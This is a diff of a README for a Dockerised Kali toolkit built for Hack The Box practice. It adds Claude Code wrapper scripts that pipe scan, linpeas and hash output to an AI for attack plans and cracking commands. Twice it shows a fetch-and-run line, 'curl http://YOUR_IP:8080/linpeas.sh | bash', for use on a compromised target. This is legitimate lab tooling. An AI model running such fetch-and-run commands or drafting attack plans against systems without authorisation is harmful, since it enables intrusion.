@@ -32,11 +32,8 @@ No more waiting for Kali to boot. No more snapshot headaches. Just `make up` and
 `hydra` `john` `hashcat`
 
 ### Windows / Active Directory
-`netexec` (CrackMapExec) `evil-winrm` `smbclient` `smbmap` `ldap-utils` `kerbrute`  
+`netexec` (CrackMapExec) `evil-winrm` `smbclient` `smbmap` `ldap-utils` `kerbrute`
 `impacket` (psexec, secretsdump, GetNPUsers, ...) `BloodHound-python` `adPEAS` `PowerSploit/PowerView`
-
-### Exploitation
-`metasploit-framework` `pwntools`
 
 ### Post-exploitation & Pivoting
 `Responder` `chisel` `ligolo-ng` `proxychains4` `socat`
@@ -44,11 +41,14 @@ No more waiting for Kali to boot. No more snapshot headaches. Just `make up` and
 ### Linux / Windows PrivEsc
 `linPEAS` `winPEAS` `pspy64`
 
+### Exploitation
+`pwntools`
+
 ### Forensics / Misc
 `binwalk` `exiftool` `steghide` `xxd` `tmux` `jq` `p7zip`
 
 ### Wordlists
-`rockyou.txt` · full `SecLists` collection  
+`rockyou.txt` · full `SecLists` collection
 Available at `$ROCKYOU`, `$WORDLISTS`, `$SECLISTS`
 
 ---
@@ -57,7 +57,7 @@ Available at `$ROCKYOU`, `$WORDLISTS`, `$SECLISTS`
 
 - Docker
 - Make
-- (Optional) Claude Code for AI-assisted analysis
+- [Claude Code](https://claude.ai/code) — for AI-assisted recon and analysis (optional but recommended)
 
 ---
 
@@ -68,13 +68,16 @@ Available at `$ROCKYOU`, `$WORDLISTS`, `$SECLISTS`
 git clone https://github.com/your-username/kali-htb-docker
 cd kali-htb-docker
 
-# 2. Build the image (~15–20 min first time)
+# 2. Build the image (~15 min first time)
 make build
 
-# 3. Connect OpenVPN on your host (HTB .ovpn file)
+# 3. Install Claude wrapper scripts (requires Claude Code)
+make install-scripts
+
+# 4. Connect OpenVPN on your host
 sudo openvpn --config ~/Downloads/your.ovpn
 
-# 4. Start the container
+# 5. Start the container
 make up
 ```
 
@@ -85,12 +88,13 @@ You're in. The container sees your `tun0` interface directly — no extra config
 ## Usage
 
 ```bash
-make up          # Start a new container
-make resume      # Jump back into a stopped container
-make shell       # Open a second shell in the running container
-make stop        # Pause (work is saved)
-make rm          # Remove container (image and ctfdata folder stay)
-make rebuild     # Rebuild image from scratch (no cache)
+make up                        # Start a new container
+make resume                    # Jump back into a stopped container
+make shell                     # Open a second shell in the running container
+make stop                      # Pause (work is saved)
+make rm                        # Remove container (image and ctfdata folder stay)
+make rebuild                   # Rebuild image from scratch (no cache)
+make serve                     # HTTP server on :8080 to serve files to targets
 ```
 
 ### Working with machines
@@ -114,7 +118,7 @@ ctfdata/
         └── notes.md
 ```
 
-### Built-in aliases
+### Built-in aliases (inside container)
 
 ```bash
 nmap-quick 10.10.11.x      # Fast open ports scan, saves to /ctfdata/scans/
@@ -125,43 +129,113 @@ ff http://10.10.11.x/      # ffuf with raft-medium wordlist
 
 ---
 
+## Claude Code Integration
+
+The most powerful part of this setup. Because the container uses `--network host` and shares `ctfdata/` with the host, Claude Code can interact with your hacking session directly.
+
+### Install wrapper scripts
+
+```bash
+make install-scripts
+```
+
+This copies 5 scripts to `/usr/local/bin`:
+
+### `ai-recon` — full recon pipeline in one command
+
+```bash
+make ai-recon IP=10.10.11.206 NAME=Forest
+# or directly:
+ai-recon 10.10.11.206 Forest
+```
+
+Runs a full port scan → service scan on open ports → whatweb if HTTP detected → Claude writes a structured attack plan and saves it to `ctfdata/notes/Forest-recon.md`.
+
+### `nmap-claude` — scan + instant analysis
+
+```bash
+nmap-claude 10.10.11.206
+nmap-claude 10.10.11.206 -p 80,443,8080   # specific ports
+```
+
+Runs nmap inside the container, Claude identifies the most interesting services and gives you prioritized next steps.
+
+### `gobuster-claude` — dir bruteforce + analysis
+
+```bash
+gobuster-claude http://10.10.11.206
+gobuster-claude http://10.10.11.206/api /usr/share/seclists/Discovery/Web-Content/api.txt
+```
+
+Runs gobuster with common extensions, Claude flags interesting paths and suggests follow-up enumeration.
+
+### `linpeas-claude` — privesc analysis
+
+```bash
+# First, get linpeas output on the target:
+# curl http://YOUR_IP:8080/linpeas.sh | bash > /tmp/linpeas.txt
+# Then copy it back and analyze:
+linpeas-claude ctfdata/loot/linpeas.txt
+```
+
+Filters out the noise from linpeas output and gives you the top 3 privesc paths with ready-to-run commands.
+
+### `hash-claude` — hash identification + cracking commands
+
+```bash
+hash-claude '5f4dcc3b5aa765d61d8327deb882cf99'
+cat ctfdata/loot/hashes.txt | hash-claude
+```
+
+Identifies the hash type and gives you the exact hashcat `-m` mode and john command, copy-paste ready.
+
+### Typical AI-assisted session
+
+```bash
+# Start
+make up
+make set-target IP=10.10.11.206
+
+# Full recon in one command
+make ai-recon IP=10.10.11.206 NAME=Forest
+
+# Web enum
+gobuster-claude http://10.10.11.206
+
+# Found a hash
+hash-claude '$6$rounds=656000$tYtUSQ4r$...'
+
+# Got a shell, ran linpeas
+make serve   # serve files from ctfdata/ on :8080
+# on target: curl http://YOUR_IP:8080/linpeas.sh | bash > /tmp/out.txt
+# copy back, then:
+linpeas-claude ctfdata/loot/linpeas.txt
+```
+
+---
+
 ## Persistence
 
 Everything important lives in `./ctfdata/` on your **host machine** — not inside the container:
 
 ```
 your-writeups/
-├── ctfdata/              ← mounted as /ctfdata inside the container
-│   ├── .bash_history     ← shell history survives rebuilds
-│   ├── .target           ← current target IP
+├── Dockerfile
+├── Makefile
+├── scripts/                  ← Claude wrapper scripts
+├── ctfdata/                  ← mounted as /ctfdata inside the container
+│   ├── .bash_history         ← shell history survives rebuilds
+│   ├── .target               ← current target IP
 │   ├── scans/
 │   ├── loot/
 │   ├── exploit/
-│   ├── notes/
-│   └── vpn/              ← put your .ovpn files here
-├── Forest/               ← your writeups live alongside
+│   ├── notes/                ← ai-recon saves summaries here
+│   └── vpn/                  ← put your .ovpn files here
+├── Forest/                   ← your writeups live alongside
 └── Active/
 ```
 
-Rebuild the image, your history, scans, and loot are all still there.
-
----
-
-## Using with Claude Code
-
-Because the container uses `--network host`, Claude Code running on your host machine can interact with it directly:
-
-```bash
-# Pipe nmap output to Claude for analysis
-nmap -sC -sV 10.10.11.206 | claude "what services look interesting and what should I try first?"
-
-# Ask Claude to help with a hash
-echo "5f4dcc3b5aa765d61d8327deb882cf99" | claude "what hash type is this and how do I crack it?"
-
-# Get next steps after gobuster
-gobuster dir -u http://10.10.11.206 -w $SECLISTS/Discovery/Web-Content/raft-medium-files.txt \
-  | claude "analyze these results and suggest what to investigate"
-```
+Rebuild the image, your history, scans, loot and AI-generated notes are all still there.
 
 ---
 
@@ -170,19 +244,16 @@ gobuster dir -u http://10.10.11.206 -w $SECLISTS/Discovery/Web-Content/raft-medi
 To add or remove tools, edit `Dockerfile` and rebuild:
 
 ```bash
-# Add a tool
-vim Dockerfile        # add apt install / pip install / git clone
-
-# Rebuild
+vim Dockerfile   # add apt install / pip install / git clone
 make rebuild
 ```
 
-The Makefile target and container name can be changed at the top of `Makefile`:
+The image name, container name and workdir can be changed at the top of `Makefile`:
 
 ```makefile
-IMAGE     := kali-ctf      # Docker image name
-CONTAINER := ctf-box       # Container name
-WORKDIR   := $(PWD)/ctfdata  # Host folder mounted into container
+IMAGE     := kali-htb
+CONTAINER := htb-box
+WORKDIR   := $(PWD)/ctfdata
 ```
 
 ---
@@ -201,10 +272,9 @@ MIT — use it, fork it, adapt it to your own toolkit.
 - [ ] Add `nuclei` + templates for vulnerability scanning
 - [ ] Add `subfinder` + `amass` for subdomain enumeration
 - [ ] Add `enum4linux-ng` (rewrite of enum4linux, better output)
-- [ ] Add `netexec` modules for MSSQL, WinRM, LDAP workflows
-- [ ] Add `pypykatz` as a Python alternative to mimikatz
 - [ ] Add `certipy` for AD CS (certificate services) attacks
 - [ ] Add `coercer` for NTLM coercion attacks
+- [ ] Add `pypykatz` as a Python alternative to mimikatz
 - [ ] Add pre-downloaded `PayloadsAllTheThings` cheatsheets to `/opt`
 - [ ] Pin SecLists to a specific release tag for reproducibility
 
@@ -212,22 +282,24 @@ MIT — use it, fork it, adapt it to your own toolkit.
 - [ ] Add `fzf` for fuzzy history search (Ctrl+R)
 - [ ] Add `zsh` + `oh-my-zsh` as an optional alternative to bash
 - [ ] Add `bat` (better `cat`) and `fd` (better `find`)
-- [ ] Auto-source `.target` file so `$TARGET` is always set on entry
 - [ ] Add a `make notes` target that opens notes.md for current machine in vim
 
 ### Workflow
 - [ ] `make vpn` — auto-detect `.ovpn` file in `ctfdata/vpn/` if only one exists
 - [ ] `make update` — pull latest versions of git-cloned tools (Responder, adPEAS, etc.)
-- [ ] `make serve` — start a quick HTTP server on port 8080 to serve loot/exploit files to targets
 - [ ] `make clean-scans` — archive old scans for a machine instead of deleting
-- [ ] Add a `docker-compose.yml` as an alternative to the Makefile for those who prefer it
+- [ ] Add a `docker-compose.yml` as an alternative to the Makefile
 
 ### Claude Code integration
-- [ ] Write wrapper scripts: `nmap-claude`, `gobuster-claude` — run tool and pipe to Claude automatically
-- [ ] Add a `make ai-recon IP=x.x.x.x` target that runs nmap + Claude analysis in one command
-- [ ] Document example prompts for common CTF scenarios in the README
+- [x] `nmap-claude` — scan and analyze with Claude
+- [x] `gobuster-claude` — dir bruteforce and analyze with Claude
+- [x] `linpeas-claude` — privesc analysis with Claude
+- [x] `hash-claude` — hash identification and cracking commands
+- [x] `ai-recon` — full recon pipeline with Claude summary
+- [ ] `bloodhound-claude` — analyze BloodHound JSON output for AD attack paths
+- [ ] `make ai-recon` — add automatic screenshot of Claude output to notes
 
 ### CI / Maintenance
-- [+] GitHub Actions workflow to build and push image to GHCR on every commit
-- [+] Weekly scheduled build to pull latest Kali packages and tool updates
-- [ ] Add a `make check` target that verifies all key tools are present and executable after build
+- [x] GitHub Actions workflow to build and push image to GHCR on every commit
+- [x] Weekly scheduled build to pull latest Kali packages
+- [ ] Add a `make check` target that verifies all key tools are present after build
